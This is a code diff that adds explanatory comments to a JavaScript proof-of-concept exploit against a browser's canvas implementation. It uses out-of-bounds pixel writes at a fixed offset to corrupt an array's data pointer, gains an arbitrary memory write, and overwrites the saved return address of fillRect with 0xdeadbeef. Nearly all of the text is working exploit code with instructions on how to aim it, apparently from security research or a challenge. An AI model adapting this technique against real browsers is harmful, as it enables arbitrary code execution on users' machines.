@@ -21,20 +21,36 @@
             ctx = document.getElementById("foo").getContext("2d");
 
             function write_at_offset(offset, val) {
+                // strokeRect() zeroes the pixel
+                // allows us to override the alpha blend and write an exact value
                 ctx.strokeRect(offset / 4, 0, 1, 1);
                 ctx.fillStyle = val;
+                // now write the actual alue
                 ctx.fillRect(offset / 4, 0, 1, 1);
             }
 
             var a = [1, 2, 3];
 
-            function arbitrary_write(rotated_address_as_color, value_as_double) {
-                write_at_offset(105084, rotated_address_as_color)
+            // the address given has to be the target address - 8
+            // The address is given as a color value
+            // this means that it has to be rotated left (because of the alpha)
+            // e.g if we want to write at 0xaabbccd8, we would pass '#bbccd0aa'
+            function arbitrary_write(rotated_address_as_color_offset8, value_as_double) {
+                // the '105084' magic is the offset of the data pointer in the m_elements
+                // of the 'var a' object from the bitmap's address
+                write_at_offset(105084, rotated_address_as_color_offset8)
+                // we overwrite that pointer with the address we want to write to - 8
+                // and then when we write the double value there, the second word of the double is written at the target address
                 a[0] = value_as_double
             }
 
 
+            // overwrite return address from the fillRect function to 0xdeadbeef
+
+            // This is the double value that corresponds to 0xdeadbeefefbe01c0 in memory
             deadbeef_double = -11885959663473424403767526989868712211998651175050994885619303016301398155916650747930379869929719770188769976194641129488039599955852478099551682560.000000;
+            // the saved eip address on the stack, when the program returns from canvasRenderingContext2D::fillRect is '0x033ff16c'
+            // subtracting 8 gives 0x033ff164, and rotating left gives '3ff16303'
             arbitrary_write('#3ff16403', deadbeef_double)
 
             for (; ;) { }
